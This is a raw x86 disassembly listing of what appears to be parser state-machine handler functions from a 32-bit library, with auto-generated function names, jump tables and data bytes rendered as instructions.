mov eax 0x2
pop ebx
pop ebp
retn
mov eax edi
mov edx [ eax + 0x8 ]
mov [ edx ] 0x26
call sub_10072470
pop edi
pop esi
mov eax 0x2
pop ebx
pop ebp
retn
mov esi edi
push 0x2
mov eax esi
call sub_100722b0
mov eax [ esi + 0x8 ]
mov [ eax ] 0x27
mov edi [ esi + 0x8 ]
mov ecx [ r--data ]
add edi 0x3c
add esp 0x4
cmp [ edi + 0x4 ] 0x0
mov [ ebp + 0x10 ] ecx
jne r-xdata
mov ebx edi
push 0x13
mov eax ebx
call sub_100722b0
mov ecx [ ebx + 0x8 ]
add esp 0x4
mov [ ecx ] 0x0
call sub_100728b0
mov edx [ ebp + 0xc ]
pop edi
pop esi
mov [ edx + 0x4 ] 0x1
mov eax 0x2
pop ebx
pop ebp
retn
mov esi edi
push 0x14
mov eax esi
call sub_100722b0
mov eax [ esi + 0x8 ]
mov edi [ ebp + 0x14 ]
push esi
mov [ eax ] 0x0
call sub_10072770
add esp 0x8
pop edi
pop esi
xor eax eax
pop ebx
pop ebp
retn
push 0x15
mov eax edi
call sub_100722b0
add esp 0x4
pop edi
pop esi
mov eax 0x2
pop ebx
pop ebp
retn
mov eax [ ebp + 0x10 ]
push edi
push eax
push esi
call sub_10062120
add esp 0xc
pop edi
pop esi
mov eax 0x2
pop ebx
pop ebp
retn
mov ebx [ esi + 0x8 ]
lea edx [ ebx + 0x50 ]
lea eax [ ebx + 0x94 ]
push edx
push eax
call sub_10061790
lea eax [ ebx + 0x94 ]
push eax
call sub_10015610
add esp 0xc
mov [ ebx + 0x48 ] eax
sub_10075285
or [ edx ] al
add cl [ eax ]
add cl [ eax ]
or [ eax ] cl
or [ eax ] cl
or [ eax ] cl
or [ eax ] cl
or [ eax ] cl
or [ eax ] cl
or [ eax ] cl
or [ eax ] cl
or [ eax ] cl
add cl [ eax ]
add ecx [ eax ]
or [ eax ] cl
add al 0x5
or [ eax ] cl
or [ eax ] cl
or [ eax ] cl
or [ eax ] cl
or [ eax ] cl
or [ eax ] cl
or [ eax ] cl
or [ eax ] cl
or [ eax ] cl
or [ eax ] cl
push es
push es
pop es
or [ eax ] cl
or [ eax ] cl
or [ eax ] cl
or [ eax ] cl
or [ eax ] cl
or [ eax ] cl
or [ eax ] cl
or [ eax ] cl
or [ eax ] cl
or [ eax ] cl
or [ eax ] cl
or [ eax ] cl
or [ eax ] cl
or [ eax ] cl
or [ eax ] cl
or [ eax ] cl
or [ esi ] al
int3
sub_100752e0
push ebp
mov ebp esp
mov ecx [ ebp + 0x10 ]
lea eax [ ecx + 0x1 ]
cmp eax 0x27
ja r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ eax + 0x8 ]
add edx 0x3c
push edx
push ecx
push eax
call sub_10062120
add esp 0xc
mov eax 0x2
pop ebp
retn
movzx eax [ eax + lookup_table_100753c0 ]
jmp [ eax * 4 + jump_table_100753ac ]
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x8 ]
mov [ edx ] 0x29
mov eax 0x2
pop ebp
retn
mov eax [ ebp + 0xc ]
mov ecx [ eax ]
mov edx [ ebp + 0x8 ]
mov [ eax + 0x6c ] ecx
mov ecx [ edx + 0x8 ]
mov [ ecx ] 0x28
mov [ eax + 0x4 ] 0x1
mov eax 0x2
pop ebp
retn
push esi
mov esi [ ebp + 0x8 ]
push 0x2
mov eax esi
call sub_100722b0
mov edx [ esi + 0x8 ]
mov eax [ r--data ]
add edx 0x3c
push edx
push eax
push esi
call sub_10062120
add esp 0x10
pop esi
mov eax 0x2
pop ebp
retn
push ebx
mov ebx [ ebp + 0x8 ]
push 0x11
mov eax ebx
call sub_100722b0
mov ecx [ ebx + 0x8 ]
add esp 0x4
mov [ ecx ] 0x0
call sub_100728b0
mov edx [ ebp + 0xc ]
mov [ edx + 0x4 ] 0x1
pop ebx
mov eax 0x2
pop ebp
retn
sub_100753c5
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al [ esp + eax ]
add al 0x3
int3
sub_100753f0
push ebp
mov ebp esp
mov ecx [ ebp + 0x10 ]
lea eax [ ecx + 0x1 ]
cmp eax 0x28
ja r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ eax + 0x8 ]
add edx 0x3c
push edx
push ecx
push eax
call sub_10062120
add esp 0xc
mov eax 0x2
pop ebp
retn
movzx eax [ eax + lookup_table_100754d0 ]
jmp [ eax * 4 + jump_table_100754bc ]
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x8 ]
mov [ edx ] 0x29
mov eax 0x2
pop ebp
retn
mov eax [ ebp + 0xc ]
mov ecx [ eax ]
mov edx [ ebp + 0x8 ]
mov [ eax + 0x6c ] ecx
mov ecx [ edx + 0x8 ]
mov [ ecx ] 0x28
mov [ eax + 0x4 ] 0x1
mov eax 0x2
pop ebp
retn
push esi
mov esi [ ebp + 0x8 ]
push 0x2
mov eax esi
call sub_100722b0
mov edx [ esi + 0x8 ]
mov eax [ r--data ]
add edx 0x3c
push edx
push eax
push esi
call sub_10062120
add esp 0x10
pop esi
mov eax 0x2
pop ebp
retn
push ebx
mov ebx [ ebp + 0x8 ]
push 0x12
mov eax ebx
call sub_100722b0
mov ecx [ ebx + 0x8 ]
add esp 0x4
mov [ ecx ] 0x0
call sub_100728b0
mov edx [ ebp + 0xc ]
mov [ edx + 0x4 ] 0x1
pop ebx
mov eax 0x2
pop ebp
retn
sub_100754d5
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al [ ebx ]
int3
sub_10075500
push ebp
mov ebp esp
mov eax [ ebp + 0x10 ]
push ebx
inc eax
push esi
push edi
cmp eax 0x61
ja r-xdata
mov eax [ ebp + 0x8 ]
mov esi [ eax + 0x8 ]
cmp [ esi + 0x40 ] 0x0
lea edi [ esi + 0x3c ]
jne r-xdata
movzx eax [ eax + lookup_table_10075684 ]
jmp [ eax * 4 + jump_table_10075668 ]
mov edx [ ebp + 0x10 ]
mov eax [ ebp + 0x8 ]
push edi
push edx
push eax
call sub_10062120
add esp 0xc
pop edi
pop esi
mov eax 0x2
pop ebx
pop ebp
retn
lea ecx [ esi + 0x50 ]
push ecx
lea ebx [ esi + 0x94 ]
push ebx
call sub_10061790
push ebx
call sub_10015610
add esp 0xc
mov [ esi + 0x48 ] eax
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x8 ]
mov [ ecx ] 0x21
call sub_10072df0
pop edi
pop esi
mov eax 0x2
pop ebx
pop ebp
retn
mov eax [ ebp + 0xc ]
mov edx [ eax ]
mov ecx [ ebp + 0x8 ]
mov [ eax + 0x6c ] edx
mov edx [ ecx + 0x8 ]
pop edi
mov [ edx ] 0x28
pop esi
mov [ eax + 0x4 ] 0x1
mov eax 0x2
pop ebx
pop ebp
retn
mov esi [ ebp + 0x8 ]
mov eax [ esi + 0x8 ]
mov [ eax ] 0x0
mov eax esi
call sub_10072df0
mov edi [ ebp + 0x14 ]
push esi
call sub_10072770
add esp 0x4
pop edi
pop esi
pop ebx
pop ebp
retn
mov edi [ ebp + 0x8 ]
push 0x2
mov eax edi
call sub_100722b0
mov esi [ edi + 0x8 ]
mov ecx [ r--data ]
lea ebx [ esi + 0x3c ]
add esp 0x4
cmp [ ebx + 0x4 ] 0x0
mov [ ebp + 0x10 ] ecx
jne r-xdata
mov ebx [ ebp + 0x8 ]
push 0x13
mov eax ebx
call sub_100722b0
mov ecx [ ebx + 0x8 ]
mov edx [ ebp + 0xc ]
mov [ ecx ] 0x0
add esp 0x4
mov [ edx + 0x4 ] 0x1
call sub_100728b0
pop edi
pop esi
mov eax 0x2
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
push 0x15
call sub_100722b0
add esp 0x4
mov eax [ ebp + 0x10 ]
push ebx
push eax
push edi
call sub_10062120
add esp 0xc
pop edi
pop esi
mov eax 0x2
pop ebx
pop ebp
retn
lea edx [ esi + 0x50 ]
lea eax [ esi + 0x94 ]
push edx
push eax
call sub_10061790
lea eax [ esi + 0x94 ]
push eax
call sub_10015610
add esp 0xc
mov [ esi + 0x48 ] eax
sub_1007568b
push es
push es
push es
add al [ edx ]
push es
add al [ esi ]
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
add al [ esi ]
add eax [ esi ]
push es
push es
add al 0x3
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
add eax [ ebx ]
add eax 0x6060606
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
add ecx esp
int3
sub_100756f0
push ebp
mov ebp esp
sub esp 0xc
push ebx
mov ebx [ ebp + 0xc ]
mov eax [ ebx + 0x6c ]
sub eax 0x25
push esi
push edi
mov [ ebp - 0x4 ] 0x0
mov edi 0x1
je r-xdata
mov eax 0x22
sub eax edi
je r-xdata
mov edi [ esi + 0x8 ]
cmp [ edi + 0x40 ] 0x0
lea eax [ edi + 0x3c ]
mov [ ebp + 0xc ] eax
jne r-xdata
mov [ ebx + 0x4 ] edi
mov edi [ esi + 0x8 ]
cmp [ edi + 0x40 ] 0x0
lea ebx [ edi + 0x3c ]
mov [ ebp + 0x8 ] eax
jne r-xdata
mov eax 0x27
jmp r-xdata
sub eax edi
je r-xdata
push eax
push 0x26
push esi
call sub_10062120
mov eax [ ebx + 0x6c ]
mov edx [ esi + 0x8 ]
add esp 0xc
pop edi
pop esi
mov [ edx ] eax
mov eax 0x2
pop ebx
mov esp ebp
pop ebp
retn
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov edx [ ebp + 0x8 ]
push ebx
push edx
push esi
call sub_10062120
mov eax [ ebp - 0x8 ]
add esp 0xc
cmp eax [ r--data ]
je r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov esi [ ebp + 0x8 ]
lea ecx [ ebp - 0xc ]
push ecx
push edi
push eax
lea edx [ ebx + 0x94 ]
push edx
push esi
call sub_1000a500
mov eax [ ebp - 0xc ]
add esp 0x14
cmp eax [ r--data ]
je r-xdata
mov eax 0x3e
mov [ ebp - 0x4 ] edi
jmp r-xdata
lea eax [ edi + 0x1f ]
jmp r-xdata
lea ecx [ edi + 0x50 ]
lea eax [ edi + 0x94 ]
push ecx
push eax
call sub_10061790
lea eax [ edi + 0x94 ]
push eax
call sub_10015610
mov [ edi + 0x48 ] eax
mov eax [ ebp + 0xc ]
add esp 0xc
mov ebx [ ebp + 0xc ]
mov eax [ ebx + 0x6c ]
mov edx [ esi + 0x8 ]
pop edi
pop esi
mov [ edx ] eax
mov eax 0x2
pop ebx
mov esp ebp
pop ebp
retn
mov edi [ esi + 0x8 ]
cmp [ edi + 0x40 ] 0x0
lea ebx [ edi + 0x3c ]
mov [ ebp + 0x8 ] eax
jne r-xdata
lea ecx [ edi + 0x50 ]
lea eax [ edi + 0x94 ]
push ecx
push eax
call sub_10061790
lea eax [ edi + 0x94 ]
push eax
call sub_10015610
add esp 0xc
mov [ edi + 0x48 ] eax
mov edx [ ebp + 0x8 ]
push ebx
push edx
push esi
call sub_10062120
add esp 0xc
cmp [ ebp - 0x4 ] 0x0
je r-xdata
lea ecx [ edi + 0x50 ]
lea eax [ edi + 0x94 ]
push ecx
push eax
call sub_10061790
lea eax [ edi + 0x94 ]
push eax
call sub_10015610
add esp 0xc
mov [ edi + 0x48 ] eax
sub_10075870
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
mov eax ebx
call sub_10072df0
mov eax [ ebp + 0x10 ]
inc eax
cmp eax 0x3f
ja r-xdata
push 0x17
mov eax ebx
call sub_100722b0
mov eax [ ebx + 0x8 ]
mov ecx [ ebp + 0xc ]
add esp 0x4
mov [ eax ] 0x21
mov [ ecx + 0x4 ] 0x1
mov eax 0x2
pop ebx
pop ebp
retn
movzx eax [ eax + lookup_table_10075938 ]
jmp [ eax * 4 + jump_table_10075924 ]
mov ecx [ ebx + 0x8 ]
mov [ ecx ] 0x21
mov eax 0x2
pop ebx
pop ebp
retn
mov edx [ ebx + 0x8 ]
mov [ edx ] 0x2a
mov eax 0x2
pop ebx
pop ebp
retn
mov eax [ ebx + 0x8 ]
push edi
mov edi [ ebp + 0x14 ]
push ebx
mov [ eax ] 0x0
call sub_10072770
add esp 0x4
pop edi
pop ebx
pop ebp
retn
push 0x16
mov eax ebx
call sub_100722b0
mov ecx [ ebx + 0x8 ]
add esp 0x4
mov [ ecx ] 0x0
call sub_100728b0
mov edx [ ebp + 0xc ]
mov [ edx + 0x4 ] 0x1
mov eax 0x2
pop ebx
pop ebp
retn
sub_1007593d
add al 0x4
add al 0x4
add al 0x1
add [ ecx + eax ] eax
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x1
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al [ esp + eax ]
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add ecx esp
int3
sub_10075980
push ebp
mov ebp esp
mov eax [ ebp + 0x10 ]
cmp eax 0xffffffff
je r-xdata
push ebx
mov ebx [ ebp + 0x8 ]
push 0x19
mov eax ebx
call sub_100722b0
mov edx [ ebx + 0x8 ]
add esp 0x4
mov [ edx ] 0x0
call sub_100728b0
pop ebx
mov eax 0x2
pop ebp
retn
cmp eax 0x3e
je r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ eax + 0x8 ]
mov ecx [ ebp + 0xc ]
push edi
mov edi [ ebp + 0x14 ]
mov [ edx ] 0x0
push eax
mov [ ecx + 0x78 ] 0x1
call sub_10072770
add esp 0x4
pop edi
pop ebp
retn
push esi
mov esi [ ebp + 0x8 ]
push 0x1a
mov eax esi
call sub_100722b0
mov eax [ esi + 0x8 ]
mov ecx [ ebp + 0xc ]
add esp 0x4
mov [ eax ] 0x21
mov [ ecx + 0x4 ] 0x1
pop esi
mov eax 0x2
pop ebp
retn
sub_10075a10
push ebp
mov ebp esp
mov eax [ ebp + 0x10 ]
push esi
mov esi [ ebp + 0x8 ]
cmp eax 0x3e
je r-xdata
mov edx [ esi + 0x8 ]
mov eax [ ebp + 0x14 ]
mov [ edx ] 0x0
call sub_10072980
pop esi
pop ebp
retn
push ebx
mov ebx [ ebp + 0xc ]
push edi
pop edi
pop ebx
test eax eax
jne r-xdata
mov ecx [ esi + 0x8 ]
add ecx 0x10
push ecx
push eax
push esi
call sub_10062120
lea edi [ ebx + 0x94 ]
push edi
call sub_1002afa0
push edi
call sub_100081a0
add esp 0x14
cmp eax 0x3e
jne r-xdata
mov eax 0xfffd
cmp eax 0xffffffff
je r-xdata
sub_10075a70
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0xc ]
mov ebx 0x1
push ebx
push 0x2
lea esi [ edi + 0x94 ]
push r--data
push esi
call sub_10003440
add esp 0x10
test eax eax
je r-xdata
push 0x0
push 0x7
push r--data
push esi
call sub_10003440
add esp 0x10
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x8 ]
mov [ ecx ] 0x2d
mov [ edi + 0x4 ] ebx
pop edi
pop esi
lea eax [ ebx + 0x1 ]
pop ebx
pop ebp
retn
cmp [ edi + 0x8 ] 0x0
je r-xdata
mov esi [ ebp + 0x8 ]
mov edx [ esi + 0x8 ]
push r--data
mov [ edx ] 0x33
push esi
mov [ edi + 0x4 ] ebx
call sub_1002bb60
push r--data
push esi
mov [ edi + 0x7c ] eax
call sub_1002bb60
push r--data
push esi
mov [ edi + 0x80 ] eax
call sub_1002bb60
add esp 0x18
mov [ edi + 0x84 ] eax
pop edi
pop esi
mov eax 0x2
pop ebx
pop ebp
retn
mov esi [ ebp + 0x8 ]
push 0x1b
mov eax esi
call sub_100722b0
mov edx [ esi + 0x8 ]
mov [ edx ] 0x2b
add esp 0x4
mov [ edi + 0x4 ] ebx
call sub_10072430
pop edi
pop esi
mov eax 0x2
pop ebx
pop ebp
retn
push ebx
push 0x7
push r--data
push esi
call sub_10003440
add esp 0x10
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x8 ]
mov [ ecx ] 0x43
mov [ edi + 0x4 ] ebx
pop edi
pop esi
mov eax 0x2
pop ebx
pop ebp
retn
sub_10075b70
push ebp
mov ebp esp
mov ecx [ ebp + 0x10 ]
lea eax [ ecx + 0x1 ]
push esi
cmp eax 0x3f
ja r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ eax + 0x8 ]
mov [ edx ] 0x2f
mov edx [ eax + 0x8 ]
add edx 0x10
push edx
push ecx
push eax
call sub_10062120
add esp 0xc
mov eax 0x2
pop esi
pop ebp
retn
movzx eax [ eax + lookup_table_10075c5c ]
jmp [ eax * 4 + jump_table_10075c48 ]
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x8 ]
mov [ edx ] 0x2e
mov eax 0x2
pop esi
pop ebp
retn
mov esi [ ebp + 0x8 ]
push 0x2
mov eax esi
call sub_100722b0
mov eax [ esi + 0x8 ]
mov [ eax ] 0x2f
mov ecx [ esi + 0x8 ]
mov edx [ r--data ]
add ecx 0x10
push ecx
push edx
push esi
call sub_10062120
add esp 0x10
mov eax 0x2
pop esi
pop ebp
retn
mov esi [ ebp + 0x8 ]
push 0x1d
mov eax esi
call sub_100722b0
mov eax [ esi + 0x8 ]
mov [ eax ] 0x0
mov eax [ ebp + 0x14 ]
add esp 0x4
call sub_10072980
xor eax eax
pop esi
pop ebp
retn
mov esi [ ebp + 0x8 ]
push 0x1c
mov eax esi
call sub_100722b0
mov ecx [ esi + 0x8 ]
mov eax [ ebp + 0x14 ]
add esp 0x4
mov [ ecx ] 0x0
call sub_10072980
xor eax eax
pop esi
pop ebp
retn
sub_10075c61
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x2
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add ecx esp
int3
sub_10075ca0
push ebp
mov ebp esp
push esi
push edi
mov edi [ ebp + 0x10 ]
lea eax [ edi + 0x1 ]
cmp eax 0x3f
ja r-xdata
mov esi [ ebp + 0x8 ]
mov eax [ esi + 0x8 ]
mov [ eax ] 0x2f
mov ecx [ esi + 0x8 ]
add ecx 0x10
push ecx
push 0x2d
push esi
call sub_10062120
mov edx [ esi + 0x8 ]
add edx 0x10
push edx
push edi
push esi
call sub_10062120
add esp 0x18
pop edi
mov eax 0x2
pop esi
pop ebp
retn
movzx eax [ eax + lookup_table_10075db0 ]
jmp [ eax * 4 + jump_table_10075d9c ]
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x8 ]
pop edi
mov [ edx ] 0x31
mov eax 0x2
pop esi
pop ebp
retn
mov esi [ ebp + 0x8 ]
push 0x2
mov eax esi
call sub_100722b0
mov eax [ esi + 0x8 ]
mov [ eax ] 0x2f
mov ecx [ esi + 0x8 ]
add ecx 0x10
push ecx
push 0x2d
push esi
call sub_10062120
mov edx [ esi + 0x8 ]
mov eax [ r--data ]
add edx 0x10
push edx
push eax
push esi
call sub_10062120
add esp 0x1c
pop edi
mov eax 0x2
pop esi
pop ebp
retn
mov esi [ ebp + 0x8 ]
push 0x1d
mov eax esi
call sub_100722b0
mov ecx [ esi + 0x8 ]
mov eax [ ebp + 0x14 ]
add esp 0x4
mov [ ecx ] 0x0
call sub_10072980
pop edi
xor eax eax
pop esi
pop ebp
retn
mov esi [ ebp + 0x8 ]
push 0x1c
mov eax esi
call sub_100722b0
mov edx [ esi + 0x8 ]
mov eax [ ebp + 0x14 ]
add esp 0x4
mov [ edx ] 0x0
call sub_10072980
pop edi
xor eax eax
pop esi
pop ebp
retn
sub_10075db5
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x2
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add edx [ ebp - 0x75 ]
in al dx
mov eax [ ebp + 0x10 ]
push esi
cmp eax 0xffffffff
je r-xdata
mov esi [ ebp + 0x8 ]
push 0x1c
mov eax esi
call sub_100722b0
mov ecx [ esi + 0x8 ]
mov eax [ ebp + 0x14 ]
add esp 0x4
mov [ ecx ] 0x0
call sub_10072980
xor eax eax
pop esi
pop ebp
retn
test eax eax
je r-xdata
mov esi [ ebp + 0x8 ]
push 0x2
mov eax esi
call sub_100722b0
mov edx [ esi + 0x8 ]
mov eax [ r--data ]
add edx 0x10
push edx
push eax
push esi
call sub_10062120
add esp 0x10
mov eax 0x2
pop esi
pop ebp
retn
cmp eax 0x2d
je r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x8 ]
mov [ ecx ] 0x30
mov eax 0x2
pop esi
pop ebp
retn
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x8 ]
add edx 0x10
push edx
push eax
push ecx
call sub_10062120
add esp 0xc
mov eax 0x2
pop esi
pop ebp
retn
sub_10075e90
push ebp
mov ebp esp
push esi
push edi
mov edi [ ebp + 0x10 ]
cmp edi 0xffffffff
je r-xdata
mov esi [ ebp + 0x8 ]
push 0x1c
mov eax esi
call sub_100722b0
mov eax [ esi + 0x8 ]
mov [ eax ] 0x0
mov eax [ ebp + 0x14 ]
add esp 0x4
call sub_10072980
pop edi
xor eax eax
pop esi
pop ebp
retn
test edi edi
je r-xdata
mov esi [ ebp + 0x8 ]
push 0x2
mov eax esi
call sub_100722b0
mov edx [ esi + 0x8 ]
mov [ edx ] 0x2f
mov eax [ esi + 0x8 ]
add eax 0x10
push eax
push 0x2d
push esi
call sub_10062120
mov ecx [ esi + 0x8 ]
mov edx [ r--data ]
add ecx 0x10
push ecx
push edx
push esi
call sub_10062120
add esp 0x1c
pop edi
mov eax 0x2
pop esi
pop ebp
retn
cmp edi 0x2d
je r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x8 ]
pop edi
mov [ ecx ] 0x31
mov eax 0x2
pop esi
pop ebp
retn
mov esi [ ebp + 0x8 ]
mov eax [ esi + 0x8 ]
mov [ eax ] 0x2f
mov ecx [ esi + 0x8 ]
add ecx 0x10
push ecx
push 0x2d
push esi
call sub_10062120
mov edx [ esi + 0x8 ]
add edx 0x10
push edx
push edi
push esi
call sub_10062120
add esp 0x18
pop edi
mov eax 0x2
pop esi
pop ebp
retn
sub_10075f60
push ebp
mov ebp esp
push esi
push edi
mov edi [ ebp + 0x10 ]
lea eax [ edi + 0x1 ]
cmp eax 0x3f
ja r-xdata
mov esi [ ebp + 0x8 ]
push 0x1d
mov eax esi
call sub_100722b0
mov ecx [ esi + 0x8 ]
mov [ ecx ] 0x2f
mov edx [ esi + 0x8 ]
add edx 0x10
push edx
push 0x2d
push esi
call sub_10062120
mov eax [ esi + 0x8 ]
add eax 0x10
push eax
push 0x2d
push esi
call sub_10062120
mov ecx [ esi + 0x8 ]
add ecx 0x10
push ecx
push edi
push esi
call sub_10062120
add esp 0x28
pop edi
mov eax 0x2
pop esi
pop ebp
retn
movzx eax [ eax + lookup_table_100760c0 ]
jmp [ eax * 4 + jump_table_100760a8 ]
mov esi [ ebp + 0x8 ]
mov ecx [ esi + 0x8 ]
mov eax [ ebp + 0x14 ]
mov [ ecx ] 0x0
call sub_10072980
pop edi
pop esi
pop ebp
retn
mov esi [ ebp + 0x8 ]
push 0x2
mov eax esi
call sub_100722b0
mov edx [ esi + 0x8 ]
mov [ edx ] 0x2f
mov eax [ esi + 0x8 ]
add eax 0x10
push eax
push 0x2d
push esi
call sub_10062120
mov ecx [ esi + 0x8 ]
add ecx 0x10
push ecx
push 0x2d
push esi
call sub_10062120
mov edx [ esi + 0x8 ]
mov eax [ r--data ]
add edx 0x10
push edx
push eax
push esi
call sub_10062120
add esp 0x28
pop edi
mov eax 0x2
pop esi
pop ebp
retn
mov esi [ ebp + 0x8 ]
push 0x1e
mov eax esi
call sub_100722b0
mov ecx [ esi + 0x8 ]
add esp 0x4
pop edi
mov [ ecx ] 0x32
mov eax 0x2
pop esi
pop ebp
retn
mov esi [ ebp + 0x8 ]
push 0x1f
mov eax esi
call sub_100722b0
mov edx [ esi + 0x8 ]
add edx 0x10
push edx
push 0x2d
push esi
call sub_10062120
add esp 0x10
pop edi
mov eax 0x2
pop esi
pop ebp
retn
mov esi [ ebp + 0x8 ]
push 0x2
mov eax esi
call sub_100722b0
mov eax [ esi + 0x8 ]
mov [ eax ] 0x0
mov eax [ ebp + 0x14 ]
add esp 0x4
call sub_10072980
pop edi
xor eax eax
pop esi
pop ebp
retn
sub_100760c6
add eax 0x5050505
add eax 0x5050505
add eax 0x5050505
add eax 0x5050505
add eax 0x5050505
add eax 0x5020505
add eax 0x5050505
add eax 0x5050505
add eax [ 0x5050505 ]
add eax 0x5050505
add eax 0x5050505
add eax 0xec8b5504
push esi
push edi
mov edi [ ebp + 0x10 ]
lea eax [ edi + 0x1 ]
cmp eax 0x3f
ja r-xdata
mov esi [ ebp + 0x8 ]
mov ecx [ esi + 0x8 ]
mov [ ecx ] 0x2f
mov edx [ esi + 0x8 ]
add edx 0x10
push edx
push 0x2d
push esi
call sub_10062120
mov eax [ esi + 0x8 ]
add eax 0x10
push eax
push 0x2d
push esi
call sub_10062120
mov ecx [ esi + 0x8 ]
add ecx 0x10
push ecx
push 0x21
push esi
call sub_10062120
mov edx [ esi + 0x8 ]
add edx 0x10
push edx
push edi
push esi
call sub_10062120
add esp 0x30
pop edi
mov eax 0x2
pop esi
pop ebp
retn
movzx eax [ eax + lookup_table_10076270 ]
jmp [ eax * 4 + jump_table_1007625c ]
mov esi [ ebp + 0x8 ]
mov ecx [ esi + 0x8 ]
mov [ ecx ] 0x30
mov edx [ esi + 0x8 ]
add edx 0x10
push edx
push 0x2d
push esi
call sub_10062120
mov eax [ esi + 0x8 ]
add eax 0x10
push eax
push 0x2d
push esi
call sub_10062120
mov ecx [ esi + 0x8 ]
add ecx 0x10
push ecx
push 0x21
push esi
call sub_10062120
add esp 0x24
pop edi
mov eax 0x2
pop esi
pop ebp
retn
mov esi [ ebp + 0x8 ]
mov edx [ esi + 0x8 ]
mov eax [ ebp + 0x14 ]
mov [ edx ] 0x0
call sub_10072980
pop edi
pop esi
pop ebp
retn
mov esi [ ebp + 0x8 ]
push 0x2
mov eax esi
call sub_100722b0
mov eax [ esi + 0x8 ]
mov [ eax ] 0x2f
mov ecx [ esi + 0x8 ]
add ecx 0x10
push ecx
push 0x2d
push esi
call sub_10062120
mov edx [ esi + 0x8 ]
add edx 0x10
push edx
push 0x2d
push esi
call sub_10062120
mov eax [ esi + 0x8 ]
add eax 0x10
push eax
push 0x21
push esi
call sub_10062120
mov ecx [ esi + 0x8 ]
mov edx [ r--data ]
add ecx 0x10
push ecx
push edx
push esi
call sub_10062120
add esp 0x34
pop edi
mov eax 0x2
pop esi
pop ebp
retn
mov esi [ ebp + 0x8 ]
push 0x21
mov eax esi
call sub_100722b0
mov eax [ esi + 0x8 ]
mov [ eax ] 0x0
mov eax [ ebp + 0x14 ]
add esp 0x4
call sub_10072980
pop edi
xor eax eax
pop esi
pop ebp
retn
sub_10076275
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x2
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add edx [ ebp - 0x75 ]
in al dx
mov eax [ ebp + 0x10 ]
inc eax
push esi
cmp eax 0x21
ja r-xdata
mov esi [ ebp + 0x8 ]
push 0x24
mov eax esi
call sub_100722b0
mov edx [ esi + 0x8 ]
mov eax [ ebp + 0xc ]
mov ecx 0x1
mov [ edx ] 0x34
add esp 0x4
mov [ eax + 0x4 ] ecx
mov [ eax + 0x88 ] ecx
lea eax [ ecx + 0x1 ]
pop esi
pop ebp
retn
movzx eax [ eax + lookup_table_1007634c ]
jmp [ eax * 4 + jump_table_10076340 ]
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x8 ]
mov [ edx ] 0x34
mov eax 0x2
pop esi
pop ebp
retn
mov esi [ ebp + 0x8 ]
push 0x22
mov eax esi
call sub_100722b0
mov eax [ esi + 0x8 ]
mov ecx [ ebp + 0xc ]
mov [ eax ] 0x0
mov eax [ ebp + 0x14 ]
add esp 0x4
mov [ ecx + 0x88 ] 0x1
call sub_10072700
xor eax eax
pop esi
pop ebp
retn
sub_1007634f
add al [ edx ]
add al [ edx ]
add al [ edx ]
add al [ ecx ]
add [ edx ] eax
add [ edx ] eax
add al [ edx ]
add al [ edx ]
add al [ edx ]
add al [ edx ]
add al [ edx ]
add al [ edx ]
add al [ edx ]
add al [ edx ]
add al [ edx ]
add esp ecx
int3
